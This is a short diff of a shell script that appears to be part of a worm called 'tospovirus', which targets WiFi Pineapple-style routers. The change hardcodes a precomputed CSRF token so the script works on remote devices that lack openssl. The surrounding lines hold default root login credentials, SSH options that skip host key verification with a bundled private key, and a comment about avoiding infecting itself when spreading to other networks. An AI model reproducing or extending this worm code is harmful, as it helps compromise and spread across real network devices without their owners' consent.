@@ -7,11 +7,12 @@
 #n00b comments provided by:
 #   ActualReverend
 
+
+#Setup some constants, note: token must be the sha1 of sessid, do not rely on openssl being available on the remote device
 creds="username=root&password=pineapplesareyummy&login="
 sessid="tospovirus"
-token="_csrfToken=$(printf "$sessid" | openssl sha1 | egrep -o "[0-9a-f][0-9a-f]+")"
+token="_csrfToken=a6f6832ff4df61608bf3e38b4facc7550e42244d"
 sshoptions="-oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /tospo/tospo_rsa"
-
 
 #Get a copy of our SSID which we'll black list so we don't do something silly like try to infect ourselves
 self=`uci get wireless.@wifi-iface[0].ssid`
